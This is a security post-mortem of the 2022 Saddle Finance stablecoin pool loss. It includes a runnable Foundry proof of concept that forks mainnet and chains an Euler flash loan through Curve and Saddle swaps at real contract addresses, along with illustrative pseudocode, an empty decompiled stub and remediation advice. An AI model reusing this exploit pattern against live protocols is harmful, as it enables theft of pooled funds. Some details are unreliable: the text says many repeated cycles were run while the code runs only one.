# Saddle Finance — StableSwap Price Imbalance Arbitrage Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-30 |
| **Protocol** | Saddle Finance |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$11,000,000 (sUSD, USDC) |
| **Attacker** | Attacker address unidentified |
| **Attack Tx** | Block 14,684,306 |
| **Vulnerable Contract** | Saddle USD V2 [0x5f86558387293b6009d7896A61fcc86C17808D62](https://etherscan.io/address/0x5f86558387293b6009d7896A61fcc86C17808D62) |
| **Root Cause** | A virtual price calculation bug in the legacy Saddle pool allowed profit to be extracted simply by repeatedly swapping sUSD back and forth between Curve and Saddle |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Saddle_exp.sol) |

---
## 1. Vulnerability Overview

Saddle Finance's USD V2 pool offered a StableSwap AMM similar to Curve Finance's sUSD pool. Due to a bug in the Saddle pool's virtual price calculation, repeatedly cycling sUSD into the Saddle pool and swapping back in reverse through the Curve pool yielded a small profit on each iteration.

The attacker borrowed 15M USDC via an Euler flash loan, then accumulated profit by cycling sUSD back and forth through a Curve-Saddle-Curve loop:
1. USDC → sUSD (Curve, index 1→3)
2. sUSD → SaddleUSDV2 (Saddle, index 0→1)
3. SaddleUSDV2 → sUSD (Saddle reverse, 1→0)
4. sUSD → USDC (Curve, index 3→1)

---
## 2. Vulnerable Code Analysis

```solidity
// Saddle StableSwap virtual price calculation bug (pseudocode)
contract SaddleSwap {
    uint256[] public balances;   // Pool token balances
    uint256 public totalSupply;  // LP token supply

    // ❌ Virtual price calculation error
    function getVirtualPrice() public view returns (uint256) {
        uint256 d = _getD(balances, amplification);
        // ❌ Due to decimal precision or calculation order errors,
        //    may return a virtual price higher or lower than actual value
        return d * 1e18 / totalSupply;
    }

    // ❌ Exchange rate depends on the incorrect virtual price
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy)
        external returns (uint256)
    {
        uint256 dy = _calculateSwap(i, j, dx);
        // ❌ dy is overestimated relative to actual value
        require(dy >= minDy, "slippage");
        // Execute token swap
        token[uint256(int256(i))].transferFrom(msg.sender, address(this), dx);
        token[uint256(int256(j))].transfer(msg.sender, dy);
        return dy;
    }
}

// ✅ Correct pattern
// Curve Finance uses the same virtual price calculation, validated through formula verification
// Saddle forked Curve but introduced a bug during certain optimization steps
// → When forking, the original formula must be rigorously verified
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**Saddle_decompiled.sol** — Related contract (vulnerable function Facet not included):
```solidity
// ❌ Root Cause: A virtual price calculation bug in the legacy Saddle pool allowed profit to be extracted simply by repeatedly swapping sUSD back and forth between Curve and Saddle
// ⚠️ Source for vulnerable function `?()` is not present in this file
// (Located in a Diamond pattern Facet or proxy implementation)
// SPDX-License-Identifier: UNLICENSED
// Source unverified — bytecode reverse-engineered
// Original: 0x5f86558387293b6009d7896A61fcc86C17808D62 (Ethereum Mainnet)
// Reverse engineering method: function selector extraction + 4byte.directory decoding

pragma solidity ^0.8.0;

contract Saddle_Decompiled {
}

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Euler flashLoan(15,000,000 USDC)
    │
    ├─[2] [Inside onFlashLoan callback]
    │       │
    │       ├─ Curve: USDC(1) → sUSD(3)
    │       │       15M USDC → ~15M sUSD
    │       │
    │       ├─ Saddle: sUSD(0) → SaddleUSDV2(1)
    │       │       ~15M sUSD → SaddleUSDV2 (Saddle bug: inflated output)
    │       │
    │       ├─ Saddle: SaddleUSDV2(1) → sUSD(0)
    │       │       SaddleUSDV2 → sUSD (reverse swap)
    │       │
    │       ├─ Curve: sUSD(3) → USDC(1)
    │       │       sUSD → USDC
    │       │
    │       └─ A small USDC surplus generated each cycle
    │           Accumulated profit by repeating multiple times
    │
    ├─[3] Repay Euler flash loan
    │
    └─[4] Loss: ~$11,000,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IEuler {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface ICurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy)
        external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy)
        external returns (uint256);
}

interface ISaddle {
    function swap(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline)
        external returns (uint256);
}

contract ContractTest is Test {
    IEuler euler   = IEuler(0x07df2ad9878F8797B4055230bbAE5C808b8259b3);
    IERC20 USDC    = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 sUSD    = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 saddleUSDv2 = IERC20(0x5f86558387293b6009d7896A61fcc86C17808D62);

    ICurve curveSUSD  = ICurve(0xA5407eAE9Ba41422680e2e00537571bcC53efBfD);
    ISaddle saddlePool = ISaddle(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_684_306);
    }

    function testExploit() public {
        // Borrow 15M USDC via Euler flash loan
        euler.flashLoan(address(USDC), 15_000_000 * 1e6, "");
        emit log_named_decimal_uint("[Profit] USDC", USDC.balanceOf(address(this)), 6);
    }

    // Euler flash loan callback
    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
        external returns (bytes32)
    {
        USDC.approve(address(curveSUSD), type(uint256).max);
        sUSD.approve(address(curveSUSD), type(uint256).max);
        sUSD.approve(address(saddlePool), type(uint256).max);
        saddleUSDv2.approve(address(saddlePool), type(uint256).max);

        // [Step 1] Curve: USDC → sUSD (index 1 → 3)
        curveSUSD.exchange_underlying(1, 3, amount, 1);

        // [Step 2] Saddle: sUSD → SaddleUSDV2 (index 0 → 1)
        // ⚡ Saddle bug: swaps sUSD for an excess amount of SaddleUSDV2
        saddlePool.swap(0, 1, sUSD.balanceOf(address(this)), 1, block.timestamp);

        // [Step 3] Saddle: SaddleUSDV2 → sUSD (index 1 → 0)
        saddlePool.swap(1, 0, saddleUSDv2.balanceOf(address(this)), 1, block.timestamp);

        // [Step 4] Curve: sUSD → USDC (index 3 → 1)
        curveSUSD.exchange_underlying(3, 1, sUSD.balanceOf(address(this)), 1);

        // Repay Euler flash loan
        USDC.approve(address(euler), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | AMM Formula Bug (StableSwap Calculation Error) |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | StableSwap Virtual Price Miscalculation |
| **Attack Vector** | Profit accumulation via repeated Curve-Saddle swaps |
| **Precondition** | Virtual price calculation bug in the Saddle pool |
| **Impact** | Profit extraction proportional to flash loan size |

---
## 6. Remediation Recommendations

1. **Fork Formula Verification**: When forking complex AMM formulas such as those from Curve, write unit tests alongside mathematical proofs.
2. **Invariant Testing**: Add invariant tests to confirm that the virtual price monotonically increases before and after each swap.
3. **Boundary Fuzzing**: Perform fuzzing tests to validate formula accuracy across a wide range of input values.
4. **Independent Formula Audit**: Obtain a separate audit from economics/mathematics experts whenever AMM formulas are modified.

---
## 7. Lessons Learned

- **Complexity of AMM Formulas**: The StableSwap formula (Curve-style) is mathematically intricate; subtle bugs can be introduced during optimization when forking.
- **Same Day as Rari Fuse**: On April 30, 2022, Rari Capital Fuse ($80M) was also attacked on the same day.
- **$11M Loss**: Saddle Finance experienced a significant decline in liquidity following this incident.
- **Responsibility of Forking**: Even when forking a battle-tested protocol, there is an independent responsibility to verify the formulas.